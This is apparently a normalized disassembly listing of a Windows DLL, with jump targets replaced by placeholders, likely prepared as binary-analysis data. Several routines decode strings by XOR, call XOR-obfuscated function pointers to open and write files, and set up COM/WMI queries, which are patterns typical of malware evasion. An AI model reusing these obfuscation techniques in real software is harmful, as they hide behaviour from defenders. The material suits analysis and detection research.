cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
sub_10065660
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
call sub_10058bff
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
pop esi
pop ebp
retn 0x4
sub_100656a0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp [ edi + 0xd58 ] 0x0
mov [ ebp - 0x2c ] eax
jne r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
and eax 0xffffffc5
mov [ ebp - 0x2c ] eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff98
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
mov esi [ edi + 0xda0 ]
mov ebx [ StrStrIW@IAT ]
xor eax eax
mov [ ebp - 0x8 ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov ecx [ r--data ]
xor eax eax
mov edi edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffee
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0x16 ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
nop
cmp [ esi + 0x14 ] 0x8
jb r-xdata
and [ ebp - 0x2c ] 0xffffffe4
call sub_10001ea0
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff4
and edx 0xff
mov [ ebp + eax * 2 - 0x14 ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov esi [ edi + 0xda0 ]
xor eax eax
mov [ ebp - 0xe ] ax
cmp esi [ edi + 0xda4 ]
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
and [ ebp - 0x2c ] 0xfffffffc
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esi 0x1c
cmp esi [ edi + 0xda4 ]
jne r-xdata
and [ ebp - 0x2c ] 0xfffffff4
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call ebx
test eax eax
je r-xdata
sub_1006581d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_10079a10
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100796a0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_100658c0
push ebp
mov ebp esp
mov edx 0x30c
mov ecx esi
xor eax eax
lea esp [ esp ]
test edx edx
jne r-xdata
add ecx 0x2
dec edx
jne r-xdata
mov ecx 0x30c
sub ecx edx
jmp r-xdata
mov eax 0x80070057
xor ecx ecx
cmp [ ecx ] ax
je r-xdata
jmp r-xdata
test eax eax
js r-xdata
pop ebp
retn 0x4
mov eax 0x30c
sub eax ecx
lea ecx [ esi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_1006c8f0
sub_1006592a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1005c3b0
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
lea ecx [ ebp + 0xc ]
call sub_10066573
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10066573
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1005c3b0
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_100659f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f113
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
mov eax [ edi + 0x18 ]
mov [ ebp - 0x4 ] edx
cmp eax edx
jne r-xdata
lea ecx [ esi + 0x18 ]
push eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_10055040
push edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10023eba
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea eax [ edi + 0x1c ]
sub_10065a80
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_10065abd
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_10065b20
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10065be0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082f29
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ edx + 0x8 ] 0x6
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xe4 ] ecx
jne r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x10
call sub_10015360
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
nop
lea edx [ ebp - 0x40 ]
mov eax 0x23
call sub_10015360
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
xor edx edx
push edx
push edx
mov [ eax ] dx
call [ CoInitializeEx@IAT ]
test eax eax
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xc8 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0xd4 ]
push ecx
lea edi [ ebp - 0xc4 ]
call sub_10029ba0
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov edi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc8 ]
mov edx [ eax ]
lea esi [ ebp - 0xcc ]
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push eax
mov eax [ edx + 0xc ]
call eax
or esi 0xffffffff
mov ebx eax
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
push 0x0
push 0x0
push 0x3
push 0x3
push 0x0
push 0x0
push 0xa
push eax
call [ CoSetProxyBlanket@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x4
jmp r-xdata
test edi edi
je r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x9
call sub_10002970
mov edi [ ebp - 0xd8 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_10029ba0
mov edi eax
lea ecx [ ebp - 0xe0 ]
push ecx
lea ebx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_1003ea40
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
xor edx edx
mov edx [ eax ]
jmp r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push edi
call sub_1006591f
add esp 0x4
push eax
call sub_1005cc3f
add esp 0x4
lea edx [ ebp - 0x58 ]
mov eax 0x2
call sub_10015360
mov eax [ ebp - 0xd0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0xcc ]
mov edi [ eax ]
lea ebx [ ebp - 0xd0 ]
push ebx
push 0x0
push 0x30
push ecx
push edx
mov edx [ edi + 0x50 ]
push eax
call edx
lea edi [ ebp - 0xd8 ]
mov ebx eax
call sub_1002eb30
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] esi
call sub_1002eb30
test ebx ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ebx 0x7
lea esi [ ebx + 0x1 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xdc ]
mov ecx [ eax ]
push 0x0
push 0x0
lea edx [ ebp - 0xfc ]
push edx
push 0x0
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov edx [ ebp - 0xf4 ]
xor ecx ecx
mov eax edx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] cx
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x34 ]
call sub_100531b0
mov edi [ ebp - 0xe4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x3
call sub_10061900
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] esi
jb r-xdata
lea ecx [ ebp - 0xfc ]
xor eax eax
push ecx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] ax
call [ VariantClear@IAT ]
mov eax [ ebp - 0xdc ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xd0 ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x34 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ eax ]
lea edx [ ebp - 0xe8 ]
push edx
lea edx [ ebp - 0xdc ]
push edx
push 0x1
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp [ ebp - 0xe8 ] 0x0
mov eax [ ebp - 0xd0 ]
je r-xdata
sub_1006600e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1006605f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
sub_100660be
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_10027fd7
pop ecx
push eax
mov esi r--data
push esi
call sub_10079480
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_1007c530
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_10027fd7
pop ecx
push eax
push esi
call sub_10079480
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_1004fd6f
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_1007e710
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_100662d9
push 0x4c
mov eax sub_1007fc17
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
mov esi ecx
mov ecx [ ebp + 0x28 ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x50 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x58 ] ebx
call sub_1004e2c1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ edi ] 0x1
add esi 0x8
push esi
push 0x0
push 0x30
call sub_1003088d
xor esi esi
add esp 0xc
movzx ebx ax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10027f70
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] bx
jb r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
call sub_10020b50
mov eax ebx
call sub_1004fa89
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
movzx eax [ eax ]
lea ecx [ ebx + 0x9 ]
cmp ecx eax
jge r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov al [ eax + esi * 2 ]
sub al bl
add al 0x30
movzx eax al
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1003f510
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1003c6eb
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov ebx [ ebp - 0x58 ]
sub_10066430
cmp [ edx + 0xd6 ] 0x0
je r-xdata
mov eax [ edx + 0xd8 ]
mov eax [ edx + 0xdc ]
jmp r-xdata
mov eax 0x1f4
retn
sub eax ecx
retn
mov ecx [ edx + 0x108 ]
add ecx [ edx + 0x100 ]
mov edx [ edx + 0x50 ]
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + edx + 0x4f ]
cmp eax ecx
jbe r-xdata
sub_10066470
push ebp
mov ebp esp
push 0xffffffff
push sub_100830a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
call sub_10003330
lea edi [ esi + 0x70 ]
xor eax eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] cx
mov [ ebp - 0x4 ] eax
mov ecx esi
mov [ esi ] r--data
call sub_1005a6c0
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp - 0x10 ] edx
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push 0x60000000
push edi
call [ ebp - 0x10 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
mov [ ebp - 0x10 ] eax
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push edx
push edi
call [ ebp - 0x10 ]
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
